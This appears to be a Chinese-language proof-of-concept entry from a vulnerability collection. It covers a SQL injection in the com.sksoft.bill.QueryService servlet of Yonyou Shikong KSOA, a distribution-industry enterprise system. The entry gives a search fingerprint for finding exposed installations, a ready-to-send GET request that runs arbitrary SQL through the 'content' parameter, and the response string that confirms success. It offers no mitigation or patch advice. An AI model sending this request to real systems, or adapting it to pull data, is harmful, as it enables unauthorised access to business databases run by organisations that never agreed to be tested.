﻿# 用友时空KSOA com.sksoft.bill.QueryService SQL注入漏洞

> 更新时间：2024-04-01

> 漏洞编号：

> 漏洞说明：用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业前沿的IT需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。用友时空KSOA com.sksoft.bill.QueryService接口存在SQL注入漏洞。

> 漏洞特征：app="用友-时空KSOA"

> 验证脚本：HTTP

```
GET /servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','123')) HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：ac59075b964b0715

> 上传文件定位：

> 验证文件来源：用友时空KSOA com.sksoft.bill.QueryService SQL注入漏洞.poc

